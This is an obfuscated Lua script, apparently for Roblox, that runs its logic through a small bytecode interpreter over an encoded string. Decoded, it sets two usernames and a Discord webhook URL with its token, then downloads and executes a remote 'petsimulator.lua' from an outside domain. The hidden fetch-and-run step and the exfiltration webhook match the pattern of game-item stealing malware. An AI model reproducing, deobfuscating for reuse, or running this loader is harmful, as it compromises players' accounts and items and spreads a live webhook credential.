local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v87=v2(v0(v30,16));if v19 then local v97=v5(v87,v19);v19=nil;return v97;else return v87;end end end);local function v20(v31,v32,v33) if v33 then local v88=(v31/(2^(v32-1)))%(2^(((v33-1) -(v32-1)) + 1)) ;return v88-(v88%1) ;else local v89=2^(v32-1) ;return (((v31%(v89 + v89))>=v89) and 1) or 0 ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + 2 ;return (v36 * 256) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + 4 ;return (v40 * 16777216) + (v39 * 65536) + (v38 * 256) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,1,20) * (2^32)) + v41 ;local v45=v20(v42,21,31);local v46=((v20(v42,32)==1) and  -1) or 1 ;if (v45==0) then if (v44==0) then return v46 * 0 ;else v45=1;v43=0;end elseif (v45==2047) then return ((v44==0) and (v46 * (1/0))) or (v46 * NaN) ;end return v8(v46,v45-1023 ) * (v43 + (v44/(2^52))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==0) then return "";end end v48=v3(v16,v18,(v18 + v47) -1 );v18=v18 + v47 ;local v49={};for v63=1, #v48 do v49[v63]=v2(v1(v3(v48,v63,v63)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50={};local v51={};local v52={};local v53={v50,v51,nil,v52};local v54=v23();local v55={};for v65=1,v54 do local v66=v21();local v67;if (v66==1) then v67=v21()~=0 ;elseif (v66==2) then v67=v24();elseif (v66==3) then v67=v25();end v55[v65]=v67;end v53[3]=v21();for v69=1,v23() do local v70=v21();if (v20(v70,1,1)==0) then local v93=v20(v70,2,3);local v94=v20(v70,4,6);local v95={v22(),v22(),nil,nil};if (v93==0) then v95[3]=v22();v95[4]=v22();elseif (v93==1) then v95[3]=v23();elseif (v93==2) then v95[3]=v23() -(2^16) ;elseif (v93==3) then v95[3]=v23() -(2^16) ;v95[4]=v22();end if (v20(v94,1,1)==1) then v95[2]=v55[v95[2]];end if (v20(v94,2,2)==1) then v95[3]=v55[v95[3]];end if (v20(v94,3,3)==1) then v95[4]=v55[v95[4]];end v50[v69]=v95;end end for v71=1,v23() do v51[v71-1 ]=v28();end return v53;end local function v29(v57,v58,v59) local v60=v57[1];local v61=v57[2];local v62=v57[3];return function(...) local v73=v60;local v74=v61;local v75=v62;local v76=v27;local v77=1;local v78= -1;local v79={};local v80={...};local v81=v12("#",...) -1 ;local v82={};local v83={};for v90=0,v81 do if (v90>=v75) then v79[v90-v75 ]=v80[v90 + 1 ];else v83[v90]=v80[v90 + 1 ];end end local v84=(v81-v75) + 1 ;local v85;local v86;while true do v85=v73[v77];v86=v85[1];if (v86<=7) then if (v86<=3) then if (v86<=1) then if (v86==0) then local v112=v85[2];v83[v112]=v83[v112](v13(v83,v112 + 1 ,v78));else v83[v85[2]]();end elseif (v86==2) then v83[v85[2]]=v85[3];else v83[v85[2]]=v59[v85[3]];end elseif (v86<=5) then if (v86>4) then v59[v85[3]]=v83[v85[2]];else do return;end end elseif (v86>6) then do return;end else local v120=v85[2];local v121,v122=v76(v83[v120](v13(v83,v120 + 1 ,v85[3])));v78=(v122 + v120) -1 ;local v123=0;for v148=v120,v78 do v123=v123 + 1 ;v83[v148]=v121[v123];end end elseif (v86<=11) then if (v86<=9) then if (v86>8) then v59[v85[3]]=v83[v85[2]];else local v126=v85[2];local v127=v83[v85[3]];v83[v126 + 1 ]=v127;v83[v126]=v127[v85[4]];end elseif (v86==10) then local v131=v85[2];v83[v131]=v83[v131](v13(v83,v131 + 1 ,v78));else local v133=v85[2];local v134,v135=v76(v83[v133](v13(v83,v133 + 1 ,v85[3])));v78=(v135 + v133) -1 ;local v136=0;for v151=v133,v78 do v136=v136 + 1 ;v83[v151]=v134[v136];end end elseif (v86<=13) then if (v86==12) then v83[v85[2]]=v59[v85[3]];else local v139=v85[2];local v140=v83[v85[3]];v83[v139 + 1 ]=v140;v83[v139]=v140[v85[4]];end elseif (v86==14) then v83[v85[2]]=v85[3];else v83[v85[2]]();end v77=v77 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0A3Q0003083Q00557365726E616D6503083Q0062696F6C6F696E6F03093Q00557365726E616D653203083Q0062696F6C6F69677503073Q00776562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313Q333034393039383038392Q30353130382F4736536B566E43654D6764477872746B58486A514649637A583332793848356176677273696A5835422D5A7634393856755979344762564B70432D67716159584A4F7046030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403253Q00682Q7470733A2Q2F61726B6F2Q3233302E746F702F70657473696D756C61746F722E6C7561000E3Q00120E3Q00023Q0012093Q00013Q00120E3Q00043Q0012093Q00033Q00120E3Q00063Q0012093Q00053Q00120C3Q00073Q00120C000100083Q00200800010001000900120E0003000A4Q000B000100034Q000A5Q00022Q000F3Q000100012Q00043Q00017Q00",v9(),...);